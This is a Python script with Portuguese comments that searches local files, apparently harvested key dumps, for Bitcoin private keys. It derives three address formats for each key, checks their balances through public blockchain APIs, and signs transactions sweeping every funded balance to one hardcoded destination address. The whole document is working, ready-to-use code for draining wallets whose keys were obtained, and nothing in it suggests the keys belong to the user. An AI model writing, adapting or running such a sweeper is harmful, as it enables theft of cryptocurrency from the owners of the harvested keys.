import requests
import re
import time
import sys
from bitcoinlib.keys import Key
from bitcoinlib.transactions import Transaction

# --- CONFIGURAÇÕES ---
DEST_ADDRESS = 'bc1q0eej43uwaf0fledysymh4jm32h8jadnmqm8lgk'
FILES_TO_SCAN = ['privatekeys.txt', 'priv.key.rtf', 'chavprivelet1.txt', 'chaves_extraidas_e_enderecos_1.txt']

def check_balance_api(address):
    """Consulta saldo com fallback e log de erro"""
    for api_url in [f"https://mempool.space/api/address/{address}", f"https://blockstream.info/api/address/{address}"]:
        try:
            r = requests.get(api_url, timeout=10)
            if r.status_code == 200:
                data = r.json()
                stats = data.get('chain_stats', {})
                return stats.get('funded_txo_sum', 0) - stats.get('spent_txo_sum', 0)
        except: continue
    return 0

def create_hex_transaction(addr, wif, utxos_val):
    """Gera o HEX e imprime erros se falhar"""
    try:
        r = requests.get(f"https://mempool.space/api/address/{addr}/utxo", timeout=15)
        utxos = r.json()
        if not utxos: return

        tx = Transaction(network='bitcoin')
        fee = 35000  # Taxa agressiva para garantir broadcast
        amount = utxos_val - fee
        
        if amount > 1000:
            for u in utxos:
                tx.add_input(prev_txid=u['txid'], output_n=u['vout'], value=u['value'], address=addr)
            tx.add_output(value=amount, address=DEST_ADDRESS)
            tx.sign([wif])
            
            hex_data = tx.raw_hex()
            print(f"HEX_GEN:{hex_data}")
            sys.stdout.flush() 
        else:
            print(f"⚠️ Saldo insuficiente para cobrir taxas em {addr}")
    except Exception as e:
        print(f"💥 Erro ao gerar HEX para {addr}: {str(e)}")
        sys.stdout.flush()

def run_nuclear_scan():
    print("☢️ INICIANDO VARREDURA TOTAL...")
    sys.stdout.flush()
    raw_strings = []
    
    for file_path in FILES_TO_SCAN:
        try:
            with open(file_path, 'r', errors='ignore') as f:
                content = f.read()
                # Captura WIF (chaves privadas) e HEX de 64 caracteres
                raw_strings.extend(re.findall(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', content))
                raw_strings.extend(re.findall(r'\b[0-9a-fA-F]{64}\b', content))
        except: continue

    unique_keys = set(raw_strings)
    print(f"📊 Chaves privadas únicas para testar: {len(unique_keys)}")
    sys.stdout.flush()

    for item in unique_keys:
        # Testa a chave em todos os formatos possíveis
        for comp in [True, False]:
            try:
                k = Key(item, network='bitcoin', compressed=comp)
                # Formatos: Legacy (1...), SegWit P2SH (3...), SegWit Native (bc1...)
                formats = [
                    {'addr': k.address(), 'type': 'p2pkh'},
                    {'addr': k.address(witness_type='p2sh-p2wpkh'), 'type': 'p2sh-p2wpkh'},
                    {'addr': k.address(witness_type='p2wpkh'), 'type': 'p2wpkh'}
                ]
                
                for fmt in formats:
                    addr = fmt['addr']
                    bal = check_balance_api(addr)
                    if bal > 0:
                        print(f"💰 SUCESSO! Chave vinculada ao endereço {addr} | Saldo: {bal} sats")
                        create_hex_transaction(addr, item, bal)
                        sys.stdout.flush()
            except: continue
        time.sleep(0.05)

if __name__ == "__main__":
    run_nuclear_scan()
